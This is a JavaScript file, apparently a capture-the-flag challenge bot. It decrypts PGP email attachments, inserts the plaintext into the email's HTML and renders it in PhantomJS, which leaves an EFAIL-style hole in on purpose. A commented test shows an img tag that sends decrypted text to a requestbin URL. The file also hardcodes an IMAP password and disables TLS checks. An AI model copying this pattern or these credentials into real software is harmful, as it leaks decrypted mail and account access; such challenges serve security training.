const notifier = require('mail-notifier');
const _ = require('lodash');
const openpgp = require('openpgp');
const config = require('./pgp-config');
const phantom = require('phantom');

// flag{exploiting-efail-for-the-flag}

// config
const passphrase = 'secret passphrase';
const imap = {
  user: "ecorp.noob@gmail.com",
  password: "27po73gXRwqzbLwMPjEg",
  host: "imap.gmail.com",
  port: 993, // imap port
  tls: true,// use secure connection
  tlsOptions: { rejectUnauthorized: false }
};
const debug = false;
const error = true;

// when email is received
const n = notifier(imap);
n.on('end', () => n.start()) // session closed
  .on('mail', (mail) => {
    try {
      // get the ciper out of the attachment
      const attachment = _.find(mail.attachments, attachment => attachment.generatedFileName === 'encrypted.asc');
      if (!attachment) return;
      let pgpCipher = attachment.content.toString('utf8');
      debug && console.log('pgpCipher', pgpCipher);

      // decrypt PGP cipher text
      const privKeyObj = openpgp.key.readArmored(config.privateKey).keys[0];
      privKeyObj.decrypt(config.passPhrase);

      const options = {
        message: openpgp.message.readArmored(pgpCipher), // parse armored message
        publicKeys: openpgp.key.readArmored(config.publicKey).keys, // for verification (optional)
        privateKeys: [privKeyObj] // for decryption
      };
       
      openpgp.decrypt(options).then((plaintext) => {
        // put together the html & plaintext
        const lastIndex = mail.html.lastIndexOf('"');
        const htmlToRender = mail.html.slice(0, lastIndex)+plaintext.data+mail.html.slice(lastIndex, mail.html.length);
        debug && console.log(htmlToRender);

        // render in PhantomJS
        (async () => {
          const instance = await phantom.create();
          const page = await instance.createPage();
          page.on('onLoadFinished', (status) => {
            page.render(false).then(()=>{
              debug && console.log('render success...');
              instance.exit();
            });
          });
          page.setContent(htmlToRender, 'http://github.com');
        })();
      });  
    }catch(e) {
      error && console.error(e);
    }
  })
  .start();

//test code for decipher
// const privKeyObj = openpgp.key.readArmored(config.privateKey).keys[0];
// privKeyObj.decrypt(config.passPhrase);

// const options = {
//   message: openpgp.message.readArmored(config.testCipher),     // parse armored message
//   publicKeys: openpgp.key.readArmored(config.publicKey).keys,    // for verification (optional)
//   privateKeys: [privKeyObj]                            // for decryption
// };
 
// openpgp.decrypt(options).then((plaintext) => {
//   const html = 'Hello mf\n\n<img src="http://requestbin.fullcontact.com/ws8ygkws/<br/>\n">';
//   const lastIndex = html.lastIndexOf('"');
//   const htmlToRender = html.slice(0, lastIndex)+plaintext.data+html.slice(lastIndex, html.length);

//   (async () => {
//     const instance = await phantom.create();
//     const page = await instance.createPage();
//     page.on('onLoadFinished', (status) => {
//       page.render(false).then(()=>{
//         instance.exit();
//       });
//     });
//     page.setContent(htmlToRender, 'http://github.com');
//   })();
// });
